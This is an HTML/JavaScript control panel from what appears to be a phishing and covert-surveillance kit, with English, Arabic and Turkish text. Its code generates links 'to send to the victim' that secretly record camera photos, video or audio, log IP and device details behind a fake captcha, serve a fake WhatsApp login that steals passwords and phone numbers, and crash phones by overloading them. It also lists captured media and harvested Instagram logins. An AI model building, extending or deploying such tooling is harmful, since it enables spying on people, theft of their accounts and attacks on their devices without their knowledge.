<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
    <title>⛧ KURABI_USER ⛧</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0c15;
            font-family: 'Segoe UI', 'Courier New', monospace;
            padding: 16px;
            min-height: 100vh;
        }
        .container { max-width: 1300px; margin: 0 auto; }
        
        /* HEADER */
        .header {
            background: #0f111a;
            border-bottom: 2px solid #00ff41;
            padding: 12px 20px;
            margin-bottom: 24px;
            border-radius: 16px 16px 0 0;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 12px;
        }
        .title { color: #00ff41; font-size: 1.6rem; font-weight: bold; text-shadow: 0 0 8px #00ff41; letter-spacing: 2px; }
        .title span { color: #ff3366; }
        .access-badge { background: #00ff4111; border: 1px solid #00ff41; padding: 6px 16px; border-radius: 30px; font-size: 0.7rem; color: #00ff41; }
        .lang-btn, .logout-btn { background: #1a1d2e; border: 1px solid #2a2e44; color: #ccc; padding: 6px 16px; border-radius: 30px; cursor: pointer; font-family: monospace; font-size: 0.7rem; transition: 0.2s; }
        .lang-btn:hover { border-color: #00ff41; color: #00ff41; }
        .logout-btn { background: #ff3366; border-color: #ff3366; color: #fff; }
        .logout-btn:hover { background: #ff0040; }
        
        /* STATS */
        .stats-grid { display: flex; gap: 16px; flex-wrap: wrap; margin-bottom: 24px; }
        .stat-card { background: #0f111a; border: 1px solid #2a2e44; border-radius: 20px; padding: 16px 24px; flex: 1; min-width: 130px; text-align: center; }
        .stat-card h4 { color: #888; font-size: 0.7rem; letter-spacing: 1px; margin-bottom: 8px; }
        .stat-card .value { color: #00ff41; font-size: 1.8rem; font-weight: bold; }
        
        /* PANEL */
        .panel { background: #0f111a; border: 1px solid #2a2e44; border-radius: 24px; padding: 20px; margin-bottom: 24px; }
        .panel h3 { color: #00ff41; margin-bottom: 18px; font-size: 1rem; border-left: 3px solid #ff3366; padding-left: 14px; }
        .panel-sub { background: #0a0c15; border-left: 3px solid #00ff41; padding: 12px 16px; margin: 12px 0; border-radius: 12px; }
        
        /* DURATION */
        .duration-slider { display: flex; align-items: center; gap: 16px; flex-wrap: wrap; background: #0a0c15; padding: 12px 16px; border-radius: 40px; margin-bottom: 20px; }
        .duration-slider label { color: #00ff41; font-size: 0.8rem; }
        .duration-slider input { flex: 1; max-width: 250px; background: #1f2235; height: 4px; border-radius: 10px; }
        .duration-value { background: #00ff4122; color: #00ff41; padding: 4px 14px; border-radius: 30px; font-weight: bold; }
        
        /* BUTTON GRUPLARI */
        .btn-group-custom { display: flex; gap: 10px; flex-wrap: wrap; margin-bottom: 15px; }
        .btn-primary { background: transparent; border: 1px solid #00ff41; color: #00ff41; padding: 10px 20px; border-radius: 40px; cursor: pointer; font-weight: bold; transition: 0.2s; }
        .btn-primary:hover { background: #00ff41; color: #000; transform: translateY(-2px); }
        .btn-instagram { border-color: #ff3366; color: #ff3366; }
        .btn-instagram:hover { background: #ff3366; color: #fff; }
        .btn-hack { border-color: #ffaa00; color: #ffaa00; }
        .btn-hack:hover { background: #ffaa00; color: #000; }
        .btn-danger-custom { border-color: #ff3366; color: #ff3366; }
        .btn-danger-custom:hover { background: #ff3366; color: #fff; }
        
        /* AYIRICI */
        .section-divider { display: flex; align-items: center; gap: 12px; margin: 20px 0 15px; }
        .section-divider span { background: #2a2e44; padding: 4px 16px; border-radius: 30px; font-size: 0.7rem; color: #00ff41; }
        .section-divider hr { flex: 1; border-color: #2a2e44; }
        
        .output-box { background: #0a0c15; border: 1px dashed #00ff41; border-radius: 16px; padding: 14px; font-size: 0.7rem; word-break: break-all; margin-top: 15px; }
        .copy-btn { background: #00ff41; border: none; padding: 4px 12px; border-radius: 20px; cursor: pointer; font-weight: bold; margin-left: 8px; }
        
        /* MEDYA KARTLARI */
        .card { background: #0f111a; border: 1px solid #2a2e44; border-radius: 20px; margin-bottom: 16px; overflow: hidden; }
        .card-header { background: #0a0c15; padding: 12px 16px; border-bottom: 1px solid #2a2e44; display: flex; justify-content: space-between; flex-wrap: wrap; gap: 8px; }
        .card-header .ip { color: #00ff41; font-size: 0.7rem; }
        .card-header .time { color: #888; font-size: 0.6rem; }
        .media-strip { display: flex; overflow-x: auto; gap: 12px; padding: 16px; }
        .media-strip img, .media-strip video { width: 100px; height: 100px; object-fit: cover; border: 2px solid #00ff41; border-radius: 12px; cursor: pointer; }
        .card-footer { padding: 12px 16px; border-top: 1px solid #2a2e44; display: flex; justify-content: flex-end; gap: 10px; }
        .download-btn, .delete-single { padding: 6px 14px; border-radius: 30px; border: none; cursor: pointer; font-size: 0.65rem; font-weight: bold; }
        .download-btn { background: #00ff41; color: #000; }
        .delete-single { background: #ff3366; color: #fff; }
        
        .loading { text-align: center; color: #00ff41; padding: 40px; }
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.97); z-index: 2000; justify-content: center; align-items: center; cursor: pointer; }
        .modal img, .modal video { max-width: 90%; max-height: 90%; border: 2px solid #00ff41; border-radius: 16px; }
        .modal-close { position: absolute; top: 20px; right: 30px; color: #00ff41; font-size: 36px; cursor: pointer; }
        body.rtl .panel h3 { border-left: none; border-right: 3px solid #ff3366; padding-left: 0; padding-right: 14px; }
        @media (max-width: 650px) { .btn-primary { padding: 6px 12px; font-size: 0.65rem; } .media-strip img { width: 70px; height: 70px; } }
    </style>
</head>

<script type="importmap">
    {
        "imports": {
            "firebase/app": "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js",
            "firebase/auth": "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js",
            "firebase/firestore": "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js"
        }
    }
</script>

<script type="module">
    import { initializeApp } from "firebase/app";
    import { getAuth, onAuthStateChanged, signOut } from "firebase/auth";
    import { getFirestore, collection, query, where, getDocs, deleteDoc, doc } from "firebase/firestore";

    const firebaseConfig = window.FIREBASE_CONFIG;
    const app = initializeApp(firebaseConfig);
    const auth = getAuth(app);
    const db = getFirestore(app);
    
    const BASE_URL = window.location.origin + window.location.pathname.replace(/\/[^/]*$/, '');

    const translations = {
        en: {
            accessText: "ACCESS: GRANTED", myCaptures: "MY CAPTURES", totalMedia: "TOTAL MEDIA",
            generateLink: "⟳ NORMAL CAMERA LINK", durationLabel: "🎬 VIDEO DURATION:",
            photo1: "📸 PHOTO (1)", photo5: "📸 5 PHOTOS", videoOnly: "🎬 VIDEO (NO AUDIO)",
            audioOnly: "🎤 AUDIO ONLY", videoAudio: "🎬🎤 VIDEO+AUDIO", instagramBtn: "📱 INSTAGRAM (CHROME)",
            refresh: "⟳ REFRESH", clearAll: "⛧ CLEAR ALL", statsInfo: "📊 STATS INFO",
            logout: "⛧ LOGOUT", copy: "COPY", linkLabel: "🔗 LINK:",
            delete: "DELETE", downloadAll: "⬇ DOWNLOAD ALL", noData: "[ NO DATA ]",
            loading: "⟳ LOADING...", confirmDelete: "⛧ Delete this capture?",
            confirmClearAll: "⛧ Delete ALL your captures?", sec: "sec",
            photo: "PHOTO", photos: "PHOTOS", video: "VIDEO", audio: "AUDIO", videoAudioMode: "VIDEO+AUDIO",
            crash: "💀 CRASH LINK", ipLogger: "📡 IP LOGGER + CAPTCHA", fakeWA: "🔐 FAKE WHATSAPP"
        },
        ar: {
            accessText: "الوصول: ممنوح", myCaptures: "التقاطاتي", totalMedia: "إجمالي الوسائط",
            generateLink: "⟳ رابط الكاميرا العادي", durationLabel: "🎬 مدة الفيديو:",
            photo1: "📸 صورة (1)", photo5: "📸 5 صور", videoOnly: "🎬 فيديو (بدون صوت)",
            audioOnly: "🎤 صوت فقط", videoAudio: "🎬🎤 فيديو+صوت", instagramBtn: "📱 إنستغرام (كروم)",
            refresh: "⟳ تحديث", clearAll: "⛧ مسح الكل", statsInfo: "📊 إحصائيات",
            logout: "⛧ تسجيل الخروج", copy: "نسخ", linkLabel: "🔗 الرابط:",
            delete: "حذف", downloadAll: "⬇ تحميل الكل", noData: "[ لا توجد بيانات ]",
            loading: "⟳ جاري التحميل...", confirmDelete: "⛧ حذف هذا العنصر؟",
            confirmClearAll: "⛧ حذف جميع العناصر؟", sec: "ثانية",
            photo: "صورة", photos: "صور", video: "فيديو", audio: "صوت", videoAudioMode: "فيديو+صوت",
            crash: "💀 رابط تجميد", ipLogger: "📡 رابط تجميع بيانات", fakeWA: "🔐 وهمي واتساب"
        }
    };

    let currentLang = localStorage.getItem('app_language') || 'en';
    let currentUser = null;

    function t(key) { return translations[currentLang][key] || translations.en[key]; }

    function applyLanguage() {
        document.getElementById('accessText').innerText = t('accessText');
        document.getElementById('myCapturesLabel').innerText = t('myCaptures');
        document.getElementById('totalMediaLabel').innerText = t('totalMedia');
        document.getElementById('generateLabel').innerHTML = t('generateLink');
        document.getElementById('durationLabel').innerHTML = t('durationLabel');
        document.getElementById('genPhotoBtn').innerHTML = t('photo1');
        document.getElementById('gen5PhotoBtn').innerHTML = t('photo5');
        document.getElementById('genVideoOnlyBtn').innerHTML = t('videoOnly');
        document.getElementById('genAudioBtn').innerHTML = t('audioOnly');
        document.getElementById('genVideoAudioBtn').innerHTML = t('videoAudio');
        document.getElementById('refreshBtn').innerHTML = t('refresh');
        document.getElementById('clearAllBtn').innerHTML = t('clearAll');
        document.getElementById('statsInfoBtn').innerHTML = t('statsInfo');
        document.getElementById('logoutBtn').innerHTML = t('logout');
        document.getElementById('langBtn').innerHTML = currentLang === 'en' ? '🇸🇦 العربية' : '🇬🇧 English';
        
        // instagram butonları da aynı dil
        document.getElementById('igPhotoBtn').innerHTML = `📸 ${t('photo1')} (INSTA)`;
        document.getElementById('ig5PhotoBtn').innerHTML = `📸 ${t('photo5')} (INSTA)`;
        document.getElementById('igVideoOnlyBtn').innerHTML = `🎬 ${t('videoOnly')} (INSTA)`;
        document.getElementById('igAudioBtn').innerHTML = `🎤 ${t('audioOnly')} (INSTA)`;
        document.getElementById('igVideoAudioBtn').innerHTML = `🎬🎤 ${t('videoAudio')} (INSTA)`;
        
        const val = document.getElementById('videoDuration').value;
        document.getElementById('durationValue').innerText = val + ' ' + t('sec');
        
        document.body.classList.toggle('rtl', currentLang === 'ar');
        document.documentElement.dir = currentLang === 'ar' ? 'rtl' : 'ltr';
    }

    document.getElementById('videoDuration').addEventListener('input', function() {
        document.getElementById('durationValue').innerText = this.value + ' ' + t('sec');
    });

    async function loadMyData() {
        if (!currentUser) return;
        const listDiv = document.getElementById('list');
        listDiv.innerHTML = `<div class="loading">${t('loading')}</div>`;
        try {
            const q = query(collection(db, "captures"), where("userId", "==", currentUser.uid));
            const snapshot = await getDocs(q);
            let myData = [];
            let totalMedia = 0;
            snapshot.forEach(docSnap => {
                const data = docSnap.data();
                myData.push({ id: docSnap.id, ...data });
                totalMedia += (data.media?.length || 0);
            });
            myData.sort((a, b) => (b.unix || 0) - (a.unix || 0));
            document.getElementById('captureCount').innerText = myData.length;
            document.getElementById('mediaCount').innerText = totalMedia;
            if (myData.length === 0) { listDiv.innerHTML = `<div class="loading">${t('noData')}</div>`; return; }
            let html = '';
            for (let item of myData) {
                const date = new Date(item.timestamp);
                const media = item.media || [];
                let modeText = '';
                switch(item.mode) {
                    case 'photo': modeText = t('photo'); break;
                    case '5photos': modeText = t('photos'); break;
                    case 'videoonly': modeText = t('video'); break;
                    case 'audio': modeText = t('audio'); break;
                    case 'videoaudio': modeText = t('videoAudioMode'); break;
                    default: modeText = item.mode;
                }
                let mediaHtml = '';
                for (let m of media) {
                    const isVideo = m.match(/\.(mp4|webm|mov)/i);
                    if (isVideo) mediaHtml += `<video src="${m}" onclick="showMedia('${m}', true)"></video>`;
                    else mediaHtml += `<img src="${m}" onclick="showMedia('${m}', false)">`;
                }
                html += `
                    <div class="card">
                        <div class="card-header">
                            <div class="ip">🌐 IP: ${item.ip || 'unknown'}</div>
                            <div class="time">⛧ ${date.toLocaleString()} | ${modeText} ${item.duration ? '('+item.duration+' '+t('sec')+')' : ''}</div>
                        </div>
                        <div class="media-strip">${mediaHtml}</div>
                        <div class="card-footer">
                            <button class="download-btn" onclick="downloadAllMedia(${JSON.stringify(media).replace(/"/g, '&quot;')})">${t('downloadAll')}</button>
                            <button class="delete-single" onclick="deleteCapture('${item.id}')">🗑 ${t('delete')}</button>
                        </div>
                    </div>
                `;
            }
            listDiv.innerHTML = html;
        } catch(err) { listDiv.innerHTML = `<div class="loading">❌ ${err.message}</div>`; }
    }
    
    window.downloadAllMedia = async (mediaUrls) => {
        for (let url of mediaUrls) {
            const a = document.createElement('a');
            a.href = url;
            a.download = url.split('/').pop().split('?')[0] || 'media';
            a.target = '_blank';
            a.click();
            await new Promise(r => setTimeout(r, 300));
        }
    };
    window.showMedia = (url, isVideo) => {
        const modal = document.getElementById('modal');
        const modalContent = document.getElementById('modalContent');
        if (isVideo) modalContent.innerHTML = `<video src="${url}" controls autoplay style="max-width:95%; max-height:95%;"></video>`;
        else modalContent.innerHTML = `<img src="${url}" style="max-width:95%; max-height:95%;">`;
        modal.style.display = 'flex';
    };
    window.deleteCapture = async (id) => {
        if (!confirm(t('confirmDelete'))) return;
        await deleteDoc(doc(db, "captures", id));
        await loadMyData();
    };
    async function clearAll() {
        if (!confirm(t('confirmClearAll'))) return;
        const q = query(collection(db, "captures"), where("userId", "==", currentUser.uid));
        const snapshot = await getDocs(q);
        for (const docSnap of snapshot.docs) await deleteDoc(doc(db, "captures", docSnap.id));
        await loadMyData();
    }
    
    function generateLink(mode, isInstagram = false) {
        if (!currentUser) return;
        let targetUrl = `${BASE_URL}/?mode=${mode}&uid=${currentUser.uid}`;
        if (mode === 'videoonly' || mode === 'videoaudio' || mode === 'audio') {
            targetUrl += `&duration=${document.getElementById('videoDuration').value}`;
        }
        if (isInstagram) targetUrl += `&force_chrome=1`;
        const outputDiv = isInstagram ? document.getElementById('igLinkOutput') : document.getElementById('linkOutput');
        outputDiv.innerHTML = `${t('linkLabel')} <a href="${targetUrl}" target="_blank" style="color:#00ff41">${targetUrl}</a> <button class="copy-btn" onclick="navigator.clipboard.writeText('${targetUrl}')">${t('copy')}</button>`;
        if(isInstagram) outputDiv.innerHTML += `<br><small style="color:#ff3366;">✅ Instagram WebView'da otomatik Chrome'a yönlendirir</small>`;
    }
    
    // HACK TOOL 1: IP LOGGER + FAKE CAPTCHA
    function generateIPLogger() {
        if (!currentUser) return;
        const hackUrl = `${BASE_URL}/hack/iplogger.html?uid=${currentUser.uid}&redirect=https://google.com`;
        document.getElementById('hackOutput').innerHTML = `${t('linkLabel')} 📡 IP LOGGER + CAPTCHA: <a href="${hackUrl}" target="_blank" style="color:#ffaa00">${hackUrl}</a> <button class="copy-btn" onclick="navigator.clipboard.writeText('${hackUrl}')">${t('copy')}</button><br><small style="color:#ffaa00;">Kurbana gönder. IP, cihaz, tarayıcı bilgisi toplar + sahte captcha</small>`;
    }
    
    // HACK TOOL 2: FAKE WHATSAPP LOGIN
    function generateFakeWA() {
        if (!currentUser) return;
        const waUrl = `${BASE_URL}/hack/fakewhatsapp.html?uid=${currentUser.uid}`;
        document.getElementById('hackOutput').innerHTML = `${t('linkLabel')} 🔐 FAKE WHATSAPP LOGIN: <a href="${waUrl}" target="_blank" style="color:#ffaa00">${waUrl}</a> <button class="copy-btn" onclick="navigator.clipboard.writeText('${waUrl}')">${t('copy')}</button><br><small style="color:#ffaa00;">WhatsApp Web sahte giriş sayfası. Şifre ve telefon numarasını çalar.</small>`;
    }
    
    function generateCrash() {
        if (!currentUser) return;
        const crashUrl = `${BASE_URL}/?crash=1&uid=${currentUser.uid}`;
        document.getElementById('hackOutput').innerHTML = `${t('linkLabel')} 💀 CRASH LINK: <a href="${crashUrl}" target="_blank" style="color:#ff0000;font-weight:bold;">${crashUrl}</a> <button class="copy-btn" onclick="navigator.clipboard.writeText('${crashUrl}')">${t('copy')}</button><br><small style="color:#ff0000;">Telefonu dondura (RAM/CPU overload)</small>`;
    }
	document.getElementById('instaLogsBtn').onclick = () => {
    if (!currentUser) return;
    const logsUrl = `${window.location.origin}/hack/instagram_logs_viewer.html?uid=${currentUser.uid}`;
    document.getElementById('hackOutput').innerHTML = `${t('linkLabel')} 📸 INSTAGRAM LOGS PANELI: <a href="${logsUrl}" target="_blank" style="color:#00ff41">${logsUrl}</a> <button class="copy-btn" onclick="navigator.clipboard.writeText('${logsUrl}')">${t('copy')}</button><br><small style="color:#00ff41;">Kendi linkine gelen kullanıcıların Instagram giriş bilgilerini gösterir</small>`;
};
    
    function showStatsInfo() {
        alert("📊 STATS\n\nBu panelde çekimleriniz listelenir.");
    }
	
    
    document.getElementById('genPhotoBtn').onclick = () => generateLink('photo', false);
    document.getElementById('gen5PhotoBtn').onclick = () => generateLink('5photos', false);
    document.getElementById('genVideoOnlyBtn').onclick = () => generateLink('videoonly', false);
    document.getElementById('genAudioBtn').onclick = () => generateLink('audio', false);
    document.getElementById('genVideoAudioBtn').onclick = () => generateLink('videoaudio', false);
    
    document.getElementById('igPhotoBtn').onclick = () => generateLink('photo', true);
    document.getElementById('ig5PhotoBtn').onclick = () => generateLink('5photos', true);
    document.getElementById('igVideoOnlyBtn').onclick = () => generateLink('videoonly', true);
    document.getElementById('igAudioBtn').onclick = () => generateLink('audio', true);
    document.getElementById('igVideoAudioBtn').onclick = () => generateLink('videoaudio', true);
    
    document.getElementById('ipLoggerBtn').onclick = generateIPLogger;
    document.getElementById('fakeWABtn').onclick = generateFakeWA;
    document.getElementById('crashBtn').onclick = generateCrash;
    
    document.getElementById('refreshBtn').onclick = loadMyData;
    document.getElementById('clearAllBtn').onclick = clearAll;
    document.getElementById('statsInfoBtn').onclick = showStatsInfo;
    document.getElementById('logoutBtn').onclick = async () => { await signOut(auth); window.location.href = 'login.html'; };
    document.getElementById('langBtn').onclick = () => { currentLang = currentLang === 'en' ? 'ar' : 'en'; localStorage.setItem('app_language', currentLang); applyLanguage(); loadMyData(); };
    
    const modal = document.getElementById('modal');
    modal.onclick = (e) => { if (e.target === modal || e.target.classList.contains('modal-close')) { modal.style.display = 'none'; document.getElementById('modalContent').innerHTML = ''; } };
    
    onAuthStateChanged(auth, (user) => {
        if (user) { currentUser = user; applyLanguage(); loadMyData(); }
        else window.location.href = 'login.html';
    });
</script>
</body>
</html>
